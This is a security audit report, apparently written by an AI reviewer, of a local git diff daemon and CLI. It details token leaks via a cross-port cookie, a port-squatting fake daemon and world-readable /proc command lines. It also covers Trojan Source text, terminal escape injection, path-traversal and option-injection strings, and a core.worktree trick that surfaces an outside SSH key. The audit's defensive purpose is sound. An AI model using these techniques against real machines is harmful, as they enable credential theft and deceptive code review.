# Security review of the MVP (Phase 2b)

Reviewer: security sub-agent, branch `review/security`, from `main` at `f777775`. Date: 2026-11-08.
Environment: Linux 6.18 (WSL2), Node 26.13.0, git 2.53.0, Chromium (Playwright) headless.

## Summary

The core promises hold up. I could not get git-core to run any program from a hostile repository.
Neither could I get the daemon to accept a cross-site, DNS-rebinding, or unauthenticated request, or
to serve a file outside `webRoot`. File names, file contents, commit subjects and branch names are
rendered as inert text, and the CSP would block inline script anyway.

The weak spots are around the **token's life outside the daemon**. The long-lived per-install token
leaks in three ways:

- through the auth cookie, which browsers send to every port on the host (SEC-01);
- through the CLI, which hands the token to whatever process answers on the daemon's port (SEC-02);
- through the opener's command line, which other local users can read (SEC-04).

Anyone holding the token can read every registered repository, including untracked files such as
`.env`, and can register and read any other repository the developer can read.

The second group is **hostile-repository content that steers the daemon outside the repository**
without executing code:

- `core.worktree` (SEC-06);
- forged linked-worktree records that make the daemon watch arbitrary directories (SEC-07);
- scan roots that follow symlinks out (SEC-08);
- escape sequences reaching the terminal (SEC-09);
- Trojan Source / bidi text shown in the diff without a warning (SEC-05).

The browser opener spawns a bare command name from the CLI's working directory (SEC-03). On Windows
that plausibly lets a hostile repository run a binary when the user runs `serve --open` inside it.

No critical or high findings. 2 medium, 1 medium/low (Windows plausible), 6 low, 3 info.

| ID | Severity | Status | Summary |
|---|---|---|---|
| SEC-01 | medium | confirmed | The auth cookie (= the permanent install token) is sent to every server on `127.0.0.1:<any port>`. A cross-site page can bounce the browser to such a server and leak it. |
| SEC-02 | medium | confirmed | `octopus-diff status` / `add` (and `serve`'s "already running" path) send the token to whatever answers the unauthenticated `/api/health` on the configured or recorded port (port squatting). |
| SEC-03 | medium (Windows, plausible) / low (POSIX, confirmed mechanism) | plausible | The browser opener (`rundll32`/`xdg-open`/`wslview`) and `doctor`'s `git` are spawned by bare name. Windows searches the cwd first; POSIX does too for an empty `PATH` entry. A binary planted in a repo then runs on `serve --open`. |
| SEC-04 | low | confirmed | `serve --open` / `status --open` put the tokenized URL on the opener's command line, and `/proc/<pid>/cmdline` is world-readable. |
| SEC-05 | low | confirmed | Bidi controls and invisible characters (Trojan Source) in diff content and file names are rendered without any marker. The reviewer sees different code than what is committed. |
| SEC-06 | low | confirmed | A hostile repo's `core.worktree` makes the API list outside file names and return outside file contents as if they were repo diffs. |
| SEC-07 | low | confirmed | A forged `.git/worktrees/<id>/gitdir` adds any directory as a "worktree". The daemon puts recursive inotify watches on it and polls it, with no per-project cap (DoS on inotify limits). |
| SEC-08 | low | confirmed | The scanner follows symlinks out of the scan root. A symlink committed in a cloned repo makes the daemon register (and watch) repositories elsewhere, or walk `/`. |
| SEC-09 | low | confirmed | The CLI's logfmt logger writes repo-controlled strings raw. An embedded bare repo whose directory name contains ESC sequences injects terminal escapes into `serve`'s stderr. |
| SEC-10 | info | confirmed | Hono routes percent-decoded paths (`/%61pi/projects` hits the API), but the security middleware's `isApiPath()` does not decode. The `?token=`-never-on-API and `Sec-Fetch-Site` rules are skipped. |
| SEC-11 | info | confirmed / plausible | Token lifecycle: one permanent token is also the 400-day cookie value, there is no rotation command, a token found world-readable is chmod'ed but kept, and the `?token=` URL lands in terminals and browser history. |
| SEC-12 | info | confirmed | Unauthenticated `/api/health` is the CLI's only daemon-identity check (it enables SEC-02) and discloses versions and uptime. |

## Threat model as tested

- **Same-browser web attacker.** I used real Chromium pages on `http://localhost:<p>` (cross-site to
  `127.0.0.1`) and `http://127.0.0.1:<p>` (same-site, other port). From each I tried:
  - CORS and no-cors fetch, a `text/plain` form POST, `EventSource` with credentials, `<script src>`
    of API JSON, and framing the UI;
  - curl with forged `Host`, `Origin` and `Sec-Fetch-Site` values for DNS rebinding and CSRF variants.
- **Other local users and processes.** Port squatting against the CLI, cookie scope across ports,
  `/proc` command lines, and state-dir and token file permissions.
- **Hostile repository content**, created under `mkdtemp` with an isolated git config:
  - roughly 40 program-running config keys and hooks, filter drivers from every config scope (local,
    worktree, `include`, `includeIf onbranch`, `core.attributesFile`);
  - a submodule with its own hostile config and `ignore = none`, a promisor remote with an `ext::` URL
    and a missing blob, and an embedded bare repo;
  - `core.worktree`, forged `worktrees/*/gitdir`, untracked symlinks to files and directories, and
    symlinks out of a scan root;
  - HTML/JS in file names, contents, commit subjects and branch names, bidi/RLO characters, newlines,
    tabs and leading-dash names.
- **Malformed API input.** Encoded and dot-segment static paths, option-looking refs, shas and file
  names, path traversal in `path`, and body and content-type checks.

Every payload only touched a marker file inside the temp dir. Each payload was first checked against
**plain git on a copy of the same repo**, so a clean result from the daemon means something:

- plain `git status`/`diff` fired `core.fsmonitor`, the filter `process`, the `post-index-change`
  hook and `diff.external`;
- in the superproject it fired the submodule's `fsmonitor` and `clean` filter;
- `git show` fired the promisor `ext::` transport.

Daemons ran in-process (`startDaemon`, port 0, temp `stateDir`/`configDir`, isolated `git.env`) or
via the built CLI (`node apps/cli/dist/index.js serve --port 0 --state-dir … --config-dir …`). The
throwaway scripts are not committed; minimal reproductions are inlined below.

## Findings

### SEC-01 · medium · confirmed: auth cookie is sent to every port on the host

**Location:** `apps/daemon/src/app.ts:199-204` (cookie value = the install token);
`apps/web/src/api/hooks.ts:35` (UI relies on the cookie, including for `EventSource`).

**Attack.** Cookies are scoped to the host, not the port. After the user opens the tokenized URL,
the browser holds `octopus_diff_token=<install token>` for `127.0.0.1`. It sends that cookie on every
same-site request to **any** `127.0.0.1:<port>`.

`SameSite=Strict` does not help here. A cross-site page navigates the browser to
`http://127.0.0.1:<attacker port>/landing`; that first request carries no cookie. But the page served
there makes a same-origin `fetch('/collect')`, and that request carries the daemon's cookie.

Who receives it:

- another local user's listener;
- any local dev server running untrusted dependencies;
- any dev server that proxies `/api` to a remote backend with cookies attached, which leaks the token
  off the machine with no attacker involved at all.

`HttpOnly` only stops page scripts from reading the cookie. Servers still see it.

**Impact.** Full read access to every registered repository, including untracked files such as
`.env` and `context=1000000` file expansion. The holder can also register and read any other repo the
developer can read (`POST /api/projects`, `POST /api/scan-roots` on `~`). The token never rotates and
the cookie lives 400 days (SEC-11). There is no write access to repositories.

**Reproduction** (Playwright, verified). Sign in at `authUrl`, then open a page on
`http://localhost:<x>/` whose script does `location = 'http://127.0.0.1:<y>/landing'`. The listener
on `<y>` serves `<script>fetch('/collect')</script>`. The listener logged:

```
/landing  sec-fetch-site=cross-site  cookie=null
/collect  sec-fetch-site=same-origin cookie=octopus_diff_token=<DAEMON TOKEN>
```

**Suggested fix.** Don't use a host-scoped cookie as the credential:

1. Bootstrap once, then keep the token in `sessionStorage`, which is scoped to the origin including
   the port. Send it as `Authorization: Bearer`. Use the contract client's fetch-based `subscribe` for
   SSE instead of `EventSource`.
2. If a cookie must stay, its value should be a per-boot session secret the daemon keeps in memory,
   never the install token. Rotate it on every daemon start and give it a short `Max-Age`. A leaked
   cookie then dies with the daemon and can't be replayed against a later run.

Also document the issue in the README security model.

### SEC-02 · medium · confirmed: the CLI gives the token to whatever answers on the port

**Location:** `apps/cli/src/commands/daemon-client.ts:72-110` (`connectToDaemon`),
`:29-37` (`findRunningDaemon`), `apps/cli/src/runtime.ts:67` (`isProcessAlive` treats `EPERM`,
i.e. a process owned by another user, as alive), `apps/cli/src/commands/status.ts:14,50`,
`apps/cli/src/commands/serve.ts:76-83`.

**Attack.** `status` and `add` pick a base URL from one of two places:

- `daemon.json`, if its pid is alive;
- otherwise the configured host and port (default `127.0.0.1:7428`).

They check it with the **unauthenticated** `/api/health` and then send `Authorization: Bearer
<token>`. Any local user can bind `127.0.0.1:7428` while the user's daemon isn't running and answer
`/api/health` with a valid-looking body.

- `status` also prints the tokenized URL, and with `--open` opens the squatter's URL with `?token=`.
- `serve`'s "already running" path trusts `daemon.json` plus pid liveness plus `/api/health`. After a
  crash it prints, and with `--open` opens, `<recorded url>/?token=…`. A squatter on the recorded port
  gets this once the pid has been reused by any process of any user.

The stolen token is permanent. When the user next runs `serve` (the CLI suggests `--port 0` if 7428
is taken), the attacker finds the new port through `/api/health` and uses the token.

**Reproduction** (verified with the built CLI). A temp `XDG_STATE_HOME` holds a token file and a temp
`XDG_CONFIG_HOME` holds `config.json` with `{"port": <squatter port>}`. The squatter answers
`/api/health` with a valid `HealthResponse` and returns 500 for everything else. Running
`octopus-diff status` and `octopus-diff add <dir>` printed:

```
octopus-diff 0.0.0 is running at http://127.0.0.1:40752
  Open:      http://127.0.0.1:40752/?token=REAL-PERSISTENT-TOKEN-0123456789abcdef
squatter captured:
  GET /api/projects   Authorization: Bearer <REAL TOKEN>
  POST /api/projects  Authorization: Bearer <REAL TOKEN>
```

**Suggested fix.** Authenticate the daemon before sending the token. Any of these works:

- a challenge-response such as `GET /api/health?challenge=<nonce>` returning
  `HMAC(token, nonce)`;
- `serve` writing a per-boot server secret into the 0600 `daemon.json` and the daemon proving it
  knows that secret;
- a Unix domain socket in the 0700 state dir for CLI-to-daemon traffic.

Also: never print or open `authUrl` for an unverified daemon, and in `isProcessAlive` don't treat
`EPERM` as "our daemon".

### SEC-03 · medium (Windows, plausible) / low (POSIX) · opener and `doctor` spawn bare command names

**Location:** `apps/cli/src/open-browser.ts:67`, which spawns `rundll32` / `wslview` /
`powershell.exe` / `xdg-open` by name with the CLI's cwd. `apps/cli/src/deps.ts:78-81` (`doctor`)
runs `execFile('git', …)` with `cwd: os.tmpdir()`.

**Attack.** libuv resolves a bare command name against the child's cwd in two cases:

- **POSIX:** when `PATH` has an empty entry (`PATH=/usr/bin:` from `export PATH=$PATH:$UNSET`) or a
  `.`. Confirmed: with `PATH=/usr/bin:/bin:` and cwd = a temp dir containing an executable
  `xdg-open`, Node's `spawn('xdg-open', …)` ran the planted file.
- **Windows:** libuv's `search_path` checks the **current directory before `PATH`**, trying `.com`
  and `.exe`. Not testable here.

A cloned hostile repository that ships `rundll32.exe` (Windows), or `xdg-open`/`wslview` (Linux or
WSL hosts where the opener isn't installed and `PATH` has an empty entry), then runs when the user
starts `octopus-diff serve --open` or `status --open` from inside it. `doctor` has the same pattern
with a world-writable cwd (`/tmp/git`), but there `git` is normally found first.

git-core already avoids this class of bug (`resolveExecutable`, DECISIONS WS1 #20). The CLI doesn't.

**Impact.** Code execution from repository content: the exact thing the plan promises can't happen.
It needs `--open` (default off, but `open: true` can live in `config.json`) and the CLI's cwd inside
the hostile repo.

**Suggested fix.** Resolve every spawned helper to an absolute path using only absolute `PATH`
entries (reuse git-core's `resolveExecutable`). On Windows, prefer
`%SystemRoot%\System32\rundll32.exe`. Spawn with `cwd: os.homedir()` or `os.tmpdir()`, never the
caller's cwd.

### SEC-04 · low · confirmed: token visible in the opener's command line

**Location:** `apps/cli/src/commands/serve.ts:83` and the banner path; `status.ts:50`;
`open-browser.ts:16-51`.

**Attack.** The tokenized URL is an argv element of the opener:

- `xdg-open URL`, and the browser's main process if it wasn't already running;
- `wslview URL`;
- PowerShell `-EncodedCommand base64(Start-Process 'URL')`.

On Linux `/proc` is mounted without `hidepid` (checked: `proc /proc proc rw,nosuid,nodev,noexec`),
so `/proc/<pid>/cmdline` (mode 0444) can be read by every local user while the opener runs. If it
launched the browser, that lasts for the browser's whole lifetime.

**Reproduction** (verified). `serve --open` with fake `wslview`/`xdg-open` scripts that sleep, then
scan `/proc/*/cmdline`:

```
pid 326613 cmdline contains the token (cmdline mode 444):
  /bin/sh …/fakebin/wslview http://127.0.0.1:40762/?token=<TOKEN>
```

**Suggested fix.** Open a single-use, short-lived login code instead of the token. The CLI asks the
daemon (authenticated, after SEC-02 is fixed) for a code valid for about 60 s and one use, then opens
`/?code=…`. This also keeps the long-term token out of browser history (SEC-11).

### SEC-05 · low · confirmed: Trojan Source / bidi text rendered without a marker

**Location:** `apps/web/src/components/FileList.tsx:273-281` (file names),
`apps/web/src/components/diff/DiffRenderer.tsx:84` (`@pierre/diffs` code rendering), and the tree
view.

**Attack.** A hostile change contains U+202E (RLO), U+2066 to U+2069 (isolates) and similar
characters. In the diff, `if (accessLevel != "user‮ ⁦// Check if admin⁩ ⁦") {` is displayed as
`if (accessLevel != "user") { // Check if admin`. The comparison actually always fails, so every user
is treated as admin.

File names are affected too: `a‮evil.txt` shows as `atxt.live` in the list and `a.livetxt` in
the tree view.

**Impact.** This is a review-integrity issue, not a confidentiality one. The tool exists to review
agent and colleague changes, and nothing warns the reviewer before they click "Mark reviewed".

**Reproduction** (verified, screenshot). Add `trojan.js` with the line above to a worktree, select
it in the UI, and see the deceptive rendering with no warning.

**Suggested fix.** Detect bidi controls (U+202A to U+202E, U+2066 to U+2069, U+200E, U+200F,
U+061C) and invisible or zero-width characters in paths and patch lines. Render them as visible
escapes (e.g. `⟨U+202E⟩`) and show a file-level banner, as GitHub does ("This file contains
bidirectional Unicode text"). Flag such files in the list as well.

### SEC-06 · low · confirmed: `core.worktree` returns content outside the repository

**Location:** `packages/git-core/src/context.ts:120-157` (`resolveRepo`). When the registered
directory isn't inside the work tree (`--is-inside-work-tree` = false), `toplevel` is null and git
silently uses `core.worktree`.

**Attack.** A cloned repo sets `core.worktree = /home/user` in `.git/config`, or a `../..` relative
form that resolves outside the clone. It also commits a placeholder `.ssh/id_ed25519`.

**Reproduction** (verified). The working-scope list showed outside files as untracked
(`.ssh/id_ed25519`), and the diff for the tracked placeholder returned the real outside file:

```
-placeholder
+-----BEGIN OPENSSH PRIVATE KEY-----
+REAL-SECRET-CONTENT
```

**Impact.** Displayed locally only, and misattributed to the repo. There is no exfiltration channel
by itself, and plain `git diff` in that clone would show the same. But octopus-diff reads it
automatically for repos found by a scan root. Combined with any token leak (SEC-01/02/04), it widens
what is exposed. Not measured: `core.worktree=/` should also turn every poll into a full-disk
`status` that runs until the 15 s timeout.

**Suggested fix.** For non-bare repos, require that the work tree git reports
(`rev-parse --show-toplevel`, run from the registered path) equals the registered or listed worktree
path. Otherwise refuse with a clear error, or pass an explicit `--work-tree=<registered path>` from
the runner.

### SEC-07 · low · confirmed: forged worktree records make the daemon watch any directory

**Location:** `packages/git-core/src/discovery.ts:95-110` (worktree records are taken verbatim from
`worktree list`, including prunable ones); `apps/daemon/src/watcher.ts:396-410` (one recursive
`@parcel/watcher` subscription per worktree root, no checks); no cap on worktrees per project.

**Attack.** A repository contains `.git/worktrees/<name>/{gitdir,HEAD,commondir}` with `gitdir`
pointing at `<any dir>/.git`. `worktree list` reports `<any dir>` as a (prunable) worktree, and the
daemon subscribes to it recursively and polls it with `git status`. That `status` fails with
`not a git repository`, or reads another of the user's repos if one is there.

**Reproduction** (verified). Point the forged record at a temp dir with 902 subdirectories. The
daemon process's inotify watches went from 6 to 915 after `POST /api/projects`. Pointing at `/` or
`$HOME`, or at hundreds of forged records, exhausts `fs.inotify.max_user_watches`. That limit is per
user, so the developer's IDE and other watchers stop working too, and the daemon spends CPU on events.

**Suggested fix.**

- Ignore worktree records whose `<path>/.git` file doesn't point back to
  `<commondir>/worktrees/<name>`. Git marks these `prunable`; skip watching and summarizing them.
- Never watch `/`, `$HOME`, or an ancestor of the common dir.
- Cap worktrees per project, and log when the cap is hit.

### SEC-08 · low · confirmed: scan roots follow symlinks out of the root

**Location:** `packages/git-core/src/discovery.ts:276-288`.

**Attack.** A cloned repo inside a scan root commits a symlink `innocent-link -> ../../elsewhere`, or
`-> /`. The scanner descends into repositories, follows the link, and registers every repository it
finds there.

**Reproduction** (verified). A scan root at `…/scanroot` containing `cloned/innocent-link →
…/elsewhere` registered `…/elsewhere/private-repo` with the scan root's id.

**Impact.** Repos the user didn't choose appear in the UI and get watched. A link to `/` gives a walk
of up to 100 000 directories plus watchers on everything found (DoS). Other users' repos are refused
by git's `safe.directory`.

**Suggested fix.** Follow a symlinked directory only if its realpath stays inside the scan root's
realpath, or make following symlinks an opt-in scan option.

### SEC-09 · low · confirmed: terminal escape injection through the CLI logger

**Location:** `apps/cli/src/logger.ts:6`. A string field is printed raw when it matches
`^[^\s"=]+$`, which allows ESC, BEL, C1 and bidi characters.

**Attack.** A cloned repo commits an **embedded bare repository** (plain files: `HEAD`, `objects/`,
`refs/`, `config`) under a directory named `x\x1b]0;OWNED-TITLE\x07\x1b[2K\x1b[1Gbare`. A scan root
discovers it, and `serve` logs `project added … name=<raw ESC…> commonDir=<raw ESC…>` to the
terminal. That sets the window title and erases the line, and could fake banner lines or write the
clipboard (OSC 52) in terminals that allow it. The embedded bare repo's own `core.fsmonitor` did
**not** run.

**Reproduction** (verified): one stderr line contained the raw bytes `\u001b]0;OWNED-TITLE\u0007…`.

**Suggested fix.** Only print values made of printable ASCII (`[\x21-\x7e]` minus `"` and `=`) raw.
JSON-escape everything else, and also escape C1 and bidi characters, which `JSON.stringify` leaves
alone.

### SEC-10 · info · confirmed: router and middleware decode paths differently

**Location:** `apps/daemon/src/app.ts:113-115,180-183,193`.

`GET /%61pi/projects` is routed by Hono to `listProjects` (200 with a valid token), but
`isApiPath(new URL(url).pathname)` is false. So:

- `?token=` is honored on an API route: `/%61pi/projects?token=T` returns a 302 with `Set-Cookie`;
- the `Sec-Fetch-Site: cross-site` rejection is skipped.

No auth bypass, since the token check runs for every path except the exact `/api/health`. But the
rules aren't applied to the paths they were written for.

**Fix:** compute `isApiPath` from the same decoded path Hono routes on, or reject requests whose path
contains percent-encoded unreserved characters.

### SEC-11 · info · token lifecycle

**Location:** `apps/daemon/src/token.ts`, `app.ts:199-204`, `serve.ts` banner.

- **Confirmed:** the install token is permanent, is also the cookie value (`Max-Age` 400 days), and
  there is no `rotate`/`logout` command; the user must delete `<stateDir>/token`.
- **Confirmed:** a token file found world-readable is chmod'ed to 0600 with a warning but **kept**.
  It may already have been read, so it should be regenerated (the CLI's `doctor` treats it as a
  failure).
- **Confirmed:** the `?token=` URL is printed to stdout (banner, `status`, `status --json`).
- **Plausible:** browser history keeps the pre-redirect `/?token=…` URL. Playwright's headless shell
  has no history database, so I could not verify it.

The single-use login code from SEC-04 and a `token rotate` command would cover all of these.

### SEC-12 · info · confirmed: unauthenticated `/api/health`

It returns name, version, `apiVersion`, git version, watcher mode and uptime (no paths, as designed).
That is harmless on its own, but it is the only thing the CLI checks before trusting a daemon (SEC-02),
and it lets a token holder find a daemon on any port.

## Defenses verified to hold

| Defense | How it was tested | Result |
|---|---|---|
| No program execution from repo config (PLAN §5.5) | Hostile `.git/config`: `core.fsmonitor`, `core.pager`, `pager.*`, `core.hooksPath` (12 hooks), `core.sshCommand`, `core.askPass`, `core.editor`, `sequence.editor`, `core.alternateRefsCommand`, `filter.<d>.clean/smudge/process/required`, a `[Filter "x"] CLEAN=` case variant, filters from `include.path`, `includeIf "onbranch:"`, `config.worktree` (worktree scope) and `core.attributesFile`, `diff.<d>.command/textconv`, `diff.external`, `gpg.program`, `gpg.ssh.program`, `credential.helper`, `log.showSignature`, `status.submoduleSummary`, an `ext::` remote, `remote.*.uploadpack`, `alias.status`, `gc.auto=1`, `maintenance.auto`. Then `exerciseAll` (add, refresh, commits, files for all five scopes, every file's diff with and without `ignoreWhitespace/context/full`, inbox, scan root). | 0 markers. Plain git on a copy fired fsmonitor, the filter process and the post-index-change hook; plain `git diff` fired `diff.external`. The daemon logged "neutralizing repository-local git filter drivers" for every local/worktree/include driver. |
| Submodule config isolation | Superproject with `submodule.sub.ignore=none`, `diff.ignoreSubmodules=none` and `.gitmodules ignore=none`; the submodule's own config has fsmonitor, filter and diff drivers; its worktree is dirty. Registered both the superproject and the submodule. | 0 markers. Plain `git status` fired `sub-fsmonitor` and `sub-filter-clean`. The explicit `--ignore-submodules=dirty` wins. |
| No lazy fetch / transport | Partial-clone repo (`extensions.partialClone`, `ext::` promisor URL, deleted blob), commit-scope diff | 0 markers; the API returned `git_error` "lazy fetching disabled". Plain `git show` fired `promisor-ext`. |
| Embedded bare repo | Bare repo committed inside a cloned repo with `core.fsmonitor`, discovered by scan | Registered, fsmonitor not run (SEC-09 is only the name). |
| Option / pathspec injection | Untracked files `--output=OWNED1`, `-o`, `--ext-diff`, `:(glob)*`, diffed via the API; `base=--output=/tmp/x`, `base=-h`, `sha=--all`, `base=HEAD@{1}`, `base=main --output` | Files diffed as literal paths, no file written. All ref and sha injections got 400 from `RefNameSchema` / `CommitShaSchema`. |
| Allowlist / no `shell: true` / argv only | Code review of `runner/allowlist.ts`, `runner.ts`, every `ctx.git` call site; env scrubbing (`env.ts`); absolute git binary resolution | Holds. Not re-run: WS1 and WS4 unit and proof tests. |
| Symlink escapes via the API | Untracked `key-link → outside/.ssh/id_ed25519` and `dir-link → outside/.ssh`; probes `path=dir-link/id_ed25519`; `git diff --no-index` on a symlink | Symlinks show their target string only. `dir-link/…` is 404 because paths must appear in `status`. `--no-index` does not follow a final-component symlink. (A parent-directory swap between `status` and the diff is a theoretical TOCTOU affecting display only.) |
| Static file traversal / symlink escape from `webRoot` | `--path-as-is` curl: `/../../../../etc/passwd`, `%2e%2e`, `..%2f`, `..%5c`, `%00`, `%2F%2F`, `%c0%ae`, `index.html%00.js`, `//etc/passwd`, double-encoded | Only `index.html` (SPA fallback after URL normalization) or 400/404. Code: per-segment decode, realpath containment. |
| Token required everywhere except `/api/health` | curl without, with a bad and with a good token on API, `/`, `/assets/*.js`, `/api/events`; `?token=` on `/api/projects`; `/api/health/`, `//api/health` | 401 everywhere except exact `/api/health`; `?token=` ignored on `/api/*` (but see SEC-10). |
| Token generation, storage and comparison | Code review (32 random bytes, base64url; SHA-256 + `timingSafeEqual`); `stat` of the state dir after `serve` | `state` 0700, `token` 0600, `daemon.json` 0600 and secret-free; loose 0755/0644 tightened (see SEC-11). Not found in logs. |
| Bootstrap redirect | `/?token=T` gives 302 `Location: /` and `Set-Cookie: …HttpOnly; SameSite=Strict; Path=/`; `//evil.com/?token=` gives `/evil.com/`; `%2F%2F` and `%5C` stay encoded | No off-host redirect. |
| Host validation (DNS rebinding) | `evil.com`, `evil.com:<p>`, `localhost.`, `foo.localhost`, `0.0.0.0`, `127.0.0.1` without port, userinfo, `%2f`, missing Host (HTTP/1.0) | All 400/403. `localhost`, `LOCALHOST`, `127.1`, `2130706433`, `0x7f.1`, `[::1]` and `127.0.0.1:0<p>` were accepted; all are loopback literals, which can't be rebound. |
| Origin validation / CSRF | `Origin: http://evil.com`, `null`, `http://localhost:<p>` (vs Host `127.0.0.1`), another port, `file://`, `chrome-extension://`, a suffix trick; `Sec-Fetch-Site: cross-site`; `text/plain` POST; preflight | 403 / 415 / 403. Same-origin and `https://<same host>` accepted (documented proxy case). |
| Browser: cross-site and same-site attacks | Playwright pages on `localhost:<x>` and `127.0.0.1:<x>`: CORS and no-cors GET, no-cors `text/plain` POST, CORS `PUT`, `EventSource({withCredentials})`, `<script src=/api/projects>`, `<iframe src=/>`, form POST (`enctype=text/plain`) | All fetches, the `EventSource` and the script failed (no CORS; CORP same-origin); the iframe was blocked by `X-Frame-Options: DENY` / `frame-ancestors 'none'`; the form POST got 403; no project registered. |
| XSS through names, diffs and highlighting | Playwright over a repo with `<img onerror>`, `<svg onload>`, `<script>` file names, HTML/JS/meta-refresh/`javascript:`/CSS payloads in contents, an HTML commit subject and author, branch `feat/"x"y`; clicked every file in unified and split mode, the tree view (`@pierre/trees`) and the commit picker; walked all shadow roots | No live injected elements, no dialogs, no CSP violations, no external requests. `@pierre/diffs` uses `innerHTML` with hast-serialized (escaped) output. |
| Security headers / CSP | curl on UI and API responses | UI: CSP without `unsafe-inline` for scripts, `base-uri 'none'`, `frame-ancestors 'none'`, `object-src 'none'`. All responses: `nosniff`, `no-referrer`, `X-Frame-Options: DENY`, COOP and CORP same-origin. API: `default-src 'none'`, `Cache-Control: no-store`. |
| Body limits | Code review (`readBody`: Content-Length check plus a streaming 1 MiB cap; JSON content type required) | Holds. |
| DoS bounds in git-core | Code review: 15 s timeout killing the process group, 64 MiB output cap, `core.bigFileThreshold` pin, `maxUntrackedFiles` 2000, concurrency 4 with per-repo queues, scan cap of 100 000 directories, scan depth ≤ 8, commits limit ≤ 500 | Holds for single requests. Repeated polling of a pathological repo (SEC-06/07) is bounded per call but not over time. |

## Not covered

- I could not test Windows or macOS, so SEC-03's Windows variant is plausible only.
- I did not watch `/` for real (SEC-07 was proven on a 902-directory temp tree).
- I did not measure ReDoS through a hostile `diff.<driver>.xfuncname` regex. It runs inside git and
  is bounded by the 15 s timeout.
- I did not test slowloris or connection-exhaustion DoS. Any local process can do that to any
  loopback server.
- I did not verify that browser history persists the tokenized URL (SEC-11).
- I did not run the perf bench, per instructions. I did not re-run the existing unit, e2e or
  read-only proof suites.

## Reproduction harness (not committed)

The scripts are in the untracked `.sec-review/` folder of the `review/security` worktree:

- `lib.mjs`: temp root, isolated git, `startDaemon` from `apps/daemon/dist`;
- `exec-config.mjs`, `exec-submodule.mjs`: payload repos with plain-git sanity checks;
- `escape.mjs`, `escape2.mjs`: core.worktree, forged worktree, symlinks, scan, inotify count;
- `serve.mjs`: long-running daemon with an XSS repo;
- `browser.mjs`, `trojan.mjs`, `tree.mjs`, `csrf.mjs`: Playwright;
- `squat.mjs`: CLI token theft;
- `argv.mjs`: `/proc` cmdline;
- `ansi.mjs`, `ansi2.mjs`: terminal escapes.

Run them with `node .sec-review/<script>.mjs` after `pnpm build`. Every temp dir and process they
created has been removed.
